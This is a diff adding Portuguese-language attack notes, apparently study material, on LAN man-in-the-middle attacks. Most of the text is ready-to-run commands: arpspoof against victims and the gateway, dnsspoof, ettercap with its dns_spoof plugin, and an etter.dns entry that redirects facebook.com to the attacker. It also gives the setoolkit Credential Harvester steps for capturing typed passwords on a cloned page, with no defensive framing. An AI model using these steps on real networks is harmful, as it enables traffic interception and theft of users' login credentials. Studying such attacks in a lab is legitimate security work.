@@ -1,0 +1,164 @@
+Direcionamento de trafego Arp Poisoning
+
+Nesse processo, o PC faz uma requisição broadcast para um computador especidico, porem o atacante se passa pelo pc solicitado, mentindo e fazendo um man in the midle.
+
+Ferramenta:
+
+arpsoof:
+
+Faz o envenamento vitimizando os dois Ips passados na opção -t
+
+Ativar roteamento global para que o atacante possa encaminhar os pacotes
+echo 1 > /proc/sys/net/ipv4/ip_foward 
+arpspoof -i eth0 -t 192.168.1.12 -r 192.168.1.13  
+  OBS: As duas maquinas vitimas, acharão que estão se comunicando uma com a outra, mas na verdade estão se comunicando com o atacante.
+
+Apos ataque realizado, verificar pacotes no wireshark:
+
+FTP é vulneravel e mostra a senha:
+
+clique no pacote> follow> tcp stream
+
+----------------------------------
+
+Ataque em rede interna - Trafego no gateway
+
+>>>Pega o trafego de toda a rede e direciona para o pc do atacante.
+arpspoof -i eth0 -t 192.168.1.12 -r 192.168.1.1  
+
+
+---------------------------------
+
+DNS Poisoning - Falsificar resposta DNS
+
+Ferramenta:
+
+setoolkit - Clone de site para ataque em rede interna\	
+
+Sequencia para clonar pagina Fake em rede interna e receber informações digitadas: 
+
+setoolkit
+Opção1:
+   1) Social-Engineering Attacks
+Opção2:
+   2) Website Attack Vectors
+Opção3:
+   3) Credential Harvester Attack Method
+Opção4:
+   2) Site Cloner
+
+Informar o IP do servidor atacante:
+
+Informar URL da pagina:
+
+---------------------------------
+
+Após os passos acima, fazer o arpspoof para enganar o cliente, fazendo se passar pelo gateway
+
+arpspoof -i wlan0 -t 192.168.1.12 -r 192.168.1.1
+
+Fazer o dsnspoof, para fazer o cliente acessar a pagina Fake digitando o endereço DNS da pagina e sendo direcionado para o nosso IP
+
+dnsspoof -i wlan0    (Dessa forma faz a falsificação na rede toda)
+
+==================================
+
+Ettercap
+
+Ettercap faz o man in the midle, captura o trafego e analisa informações sensiveis para o atacante. Pode até mesmo falsificar SSL
+
+
+O ettercap possui 3 interfaces, no terminal e grafica
+
+sintaxe basica:
+
+ettercap -Tq -i wlan0 -M arp /192.168.1.1// /192.168.1.12//
+
+Opções:
+	-Tq
+	-M = Tipo de Main in the midle
+	gateway da rede
+	vitima/vitimas (pode utilizar faixa de IPs para envenenamento)
+
+Pode usar a opção /// para todos os dispositivos da rede ser capturados.
+
+========================================
+
+Para atque funcional:
+
+Adicionar entradas DNS "A" no final do arquivo:
+vi /etc/ettercap/etter.dns
+    *facebook.com   A   192.168.1.10
+
+Fazer o clone da pagina com o comando:
+
+setoolkit
+
+Seguir os passos descritos no settolkit e no final informar o IP do atacante e URL para clonar
+
+Usar o ettercap para fazer o dns_spoof e enganar os clientes, para que toda vez que informarem a url colocada no etter.dns, acessarem o nosso server:
+
+ettercap -T -q -M arp -i wlan0 -P dns_spoof ///
+
+
+A partir dai, verificar as conexões nos logs e na saida do terminal rodando o setoolkit. 
+
+Para clone de pagina pode usar o httrack tambem, porem esse literalmente clona a pagina e o pacote precisa ser colocado no apache
+
+
+
+                      ..:::::::::..
+                                        ..:::aad8888888baa:::..
+                                                      .::::d:?88888888888?::8b::::.
+                                                                  .:::d8888:?88888888??a888888b:::.
+                                                                            .:::d8888888a8888888aa8888888888b:::.
+                                                                                     ::::dP::::::::88888888888::::::::Yb::::
+                                                                                             ::::dP:::::::::Y888888888P:::::::::Yb::::
+                                                                                                    ::::d8:::::::::::Y8888888P:::::::::::8b::::
+                                                                                                          .::::88::::::::::::Y88888P::::::::::::88::::.
+                                                                                                                :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
+                                                                                                                      :::::::Y88888888888P::|::Y88888888888P:::::::
+                                                                                                                            ::::::::::::::::888:::|:::888::::::::::::::::
+                                                                                                                                  `:::::::::::::::8888888888888b::::::::::::::'
+                                                                                                                                         :::::::::::::::88888888888888::::::::::::::
+                                                                                                                                                 :::::::::::::d88888888888888:::::::::::::
+                                                                                                                                                          ::::::::::::88::88::88:::88::::::::::::
+                                                                                                                                                                    `::::::::::88::88::88:::88::::::::::'
+                                                                                                                                                                                `::::::::88::88::P::::88::::::::'
+                                                                                                                                                                                              `::::::88::88:::::::88::::::'
+                                                                                                                                                                                                               ``:::::::::::::::::::''
+                                                                                                                                                                                                                                     ``:::::::::''
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
